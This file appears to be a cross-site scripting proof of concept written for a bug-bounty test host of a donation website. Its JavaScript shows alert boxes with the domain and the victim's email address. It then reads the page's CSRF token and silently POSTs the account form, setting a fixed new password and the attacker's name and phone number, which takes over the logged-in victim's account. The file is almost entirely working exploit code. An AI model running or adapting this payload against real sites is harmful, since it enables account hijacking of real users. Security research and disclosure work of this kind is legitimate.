alert(document.domain + "it's will set a new password to your account,If you have been logined.");
var inputDisplay1 = document.querySelector('.input-display');
var text1 = inputDisplay1?.textContent.trim();
var email1 = text1?.split('\n')[0].trim();
alert("Your email account is " + email1 + "will be set a new password.");


 // 查找包含csrf_token的input元素
const csrfTokenElement = window.csrfToken;
if (csrfTokenElement) {
    const formData = new URLSearchParams();
    formData.append('password', 'SetANewPassword');
    formData.append('passwordConfirm', 'SetANewPassword');
    formData.append('first', 'attacker');
    formData.append('last', 'you');
    formData.append('phone', '(760) 278-1253');
    formData.append('optedIntoTransactionalTexts', 'true');
    formData.append('_optedIntoTransactionalTexts', 'on');
    formData.append('_optedIntoMarketingTexts', 'on');
    formData.append('birthday', '');
    formData.append('birthdayMonth', '');
    formData.append('birthdayDate', '');
    formData.append('_csrf', csrfTokenElement);
    formData.append('myaccount', 'Save changes');
            
    // 发送 POST 请求（不处理返回数据）
    fetch('https://bugbounty-secure.dctest.donorschoose.org/common/private-info.html', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: formData.toString()
    })
    .catch(error => {
      console.error('Request failed:', error);
    });
}

